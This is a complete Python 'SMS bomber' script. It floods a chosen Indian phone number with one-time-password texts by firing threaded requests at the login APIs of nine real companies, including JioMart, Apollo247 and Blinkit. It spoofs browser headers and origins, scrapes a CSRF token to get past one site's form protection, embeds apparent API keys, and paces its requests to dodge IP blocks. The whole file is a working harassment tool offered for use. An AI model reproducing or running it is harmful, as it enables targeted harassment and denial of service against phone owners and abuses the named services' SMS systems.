import requests
import os
import time
import threading
import json
from bs4 import BeautifulSoup

# --- COLORS ---
G = "\033[92m" # Green
R = "\033[91m" # Red
Y = "\033[93m" # Yellow
W = "\033[0m"  # White

success_count = 0
failed_count = 0
lock = threading.Lock()

# ---------------------------------------------------------
# API DATABASE (All Your Discovered APIs Combined)
# ---------------------------------------------------------
SMS_APIS = [
    {
        "name": "TVS Motor",
        "method": "SPECIAL_TVS",
        "url": "https://www.tvsmotor.com/api/Ecommerce/GetAccountOtp",
        "login_url": "https://www.tvsmotor.com/account/login"
    },
    {
        "name": "JioMart",
        "method": "POST",
        "url": "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp",
        "json": {"mobile": "{target}"},
        "headers": {"Origin": "https://account.relianceretail.com", "Referer": "https://account.relianceretail.com/"}
    },
    {
        "name": "Tata 1mg",
        "method": "POST",
        "url": "https://www.1mg.com/pwa-api/auth/create_token",
        "json": {"referral_code": None, "is_doctor": False, "number": "{target}"},
        "headers": {"Origin": "https://www.1mg.com", "Referer": "https://www.1mg.com/auth/login"}
    },
    {
        "name": "Allen",
        "method": "POST",
        "url": "https://api.allen-live.in/api/v1/auth/sendOtp?center_id=&source=home-page-login",
        "json": {
            "country_code": "91",
            "phone_number": "{target}",
            "persona_type": "STUDENT",
            "otp_type": "SHARED_DEFAULT"
        },
        "headers": {"Origin": "https://www.allen.in", "Referer": "https://www.allen.in/"}
    },
    {
        "name": "Apollo247",
        "method": "POST",
        "url": "https://apigateway.apollo247.in/auth-service/generateOtp",
        "json": {"loginType": "PATIENT", "mobileNumber": "+91{target}"},
        "headers": {
            "X-Apollo-Pre-Auth-Key": "eyJHbGciOiJIUzI1NiJ9.ZTVhM2I0YmEtY2E0NC00M2I0LTg0ZTUtZDU3M2M1YjRjZTU3.XyJ9",
            "platform": "web",
            "Origin": "https://www.apollo247.com"
        }
    },
    {
        "name": "Mamaearth",
        "method": "POST",
        "url": "https://gkx.gokwik.co/kp/api/v1/auth/otp/send",
        "json": {"phone": "{target}", "country": "in", "country_code": "+91"},
        "headers": {"Gk-Merchant-Id": "12wyqc26spoknx0kv7t", "Origin": "https://mamaearth.in"}
    },
    {
        "name": "Housing", 
        "method": "POST", 
        "url": "https://login.housing.com/api/v2/send-otp", 
        "json": {"phone": "{target}"}
    },
    {
        "name": "ConfirmTkt", 
        "method": "GET", 
        "url": "https://securedapi.confirmtkt.com/api/platform/register", 
        "params": {"newOtp": "true", "mobileNumber": "{target}"}
    },
    {
        "name": "Blinkit",
        "method": "POST",
        "url": "https://blinkit.com/v1/user/otp/send",
        "json": {"phone": "{target}"},
        "headers": {"app_client": "consumer_web"}
    }
]

# ---------------------------------------------------------
# SPECIAL HANDLING FUNCTIONS
# ---------------------------------------------------------

def get_tvs_token(login_url, user_agent):
    """TVS की वेबसाइट से ताज़ा टोकन निकालता है"""
    session = requests.Session()
    headers = {"User-Agent": user_agent}
    try:
        res = session.get(login_url, headers=headers, timeout=10)
        soup = BeautifulSoup(res.text, 'html.parser')
        token = soup.find('input', {'name': '__RequestVerificationToken'})['value']
        return token, session.cookies
    except:
        return None, None

# ---------------------------------------------------------
# CORE SENDER
# ---------------------------------------------------------

def send_otp(api, target):
    global success_count, failed_count
    
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    
    headers = {
        "User-Agent": user_agent,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json"
    }
    
    if "headers" in api:
        headers.update(api["headers"])
    
    try:
        res = None
        
        # 1. Handling TVS (Special)
        if api.get("method") == "SPECIAL_TVS":
            headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
            headers["X-Requested-With"] = "XMLHttpRequest"
            token, cookies = get_tvs_token(api["login_url"], user_agent)
            if token:
                payload = {
                    "MobileNumber": target,
                    "Locale": "V",
                    "__RequestVerificationToken": token
                }
                res = requests.post(api["url"], data=payload, cookies=cookies, headers=headers, timeout=10)
            else:
                raise Exception("TVS Token Error")

        # 2. Handling GET
        elif api["method"] == "GET":
            url = api["url"].replace("{target}", target)
            params_p = {k: v.replace("{target}", target) if isinstance(v, str) else v for k, v in api.get("params", {}).items()}
            res = requests.get(url, params=params_p, headers=headers, timeout=10)

        # 3. Handling Normal POST (JSON)
        else:
            url = api["url"].replace("{target}", target)
            # JSON string replacement to handle null/false correctly
            json_str = json.dumps(api["json"]).replace("{target}", target)
            json_p = json.loads(json_str)
            res = requests.post(url, json=json_p, headers=headers, timeout=10)

        # Final Verification
        if res and res.status_code in [200, 201, 202] and ("fail" not in res.text.lower()):
            with lock:
                success_count += 1
            print(f"{G}[SUCCESS]{W} {api['name']} sent OTP to {target}")
        else:
            with lock:
                failed_count += 1
            print(f"{R}[FAILED]{W} {api['name']} - Status: {res.status_code if res else 'No Response'}")
            
    except Exception:
        with lock:
            failed_count += 1
        print(f"{Y}[ERROR]{W} {api['name']} connection error")

# ---------------------------------------------------------
# CONTROLLER
# ---------------------------------------------------------

def start_bombing(target, count):
    print(f"\n{Y}[!] Bombing started on {target}...{W}\n")
    threads = []
    
    for i in range(count):
        api = SMS_APIS[i % len(SMS_APIS)]
        t = threading.Thread(target=send_otp, args=(api, target))
        t.start()
        threads.append(t)
        
        # Rate limiting to prevent instant IP block
        time.sleep(0.4)

    for t in threads:
        t.join()

    print(f"\n{G}--- BOMBING FINISHED ---{W}")
    print(f"{G}Success: {success_count}{W} | {R}Failed: {failed_count}{W}")

if __name__ == "__main__":
    os.system('clear || cls')
    print(f"""
{Y}╔══════════════════════════════════════════╗
║        MEGA SMS BOMBER v3.0              ║
║    (JioMart, 1mg, Allen, TVS Added)      ║
╚══════════════════════════════════════════╝{W}""")
    
    target_num = input(f"\n{W}Target Number (10 Digits): {G}")
    if len(target_num) == 10 and target_num.isdigit():
        try:
            sms_count = int(input(f"{W}Number of SMS: {G}"))
            start_bombing(target_num, sms_count)
        except ValueError:
            print(f"{R}[!] Enter a valid number!{W}")
    else:
        print(f"{R}[!] Invalid Mobile Number!{W}")
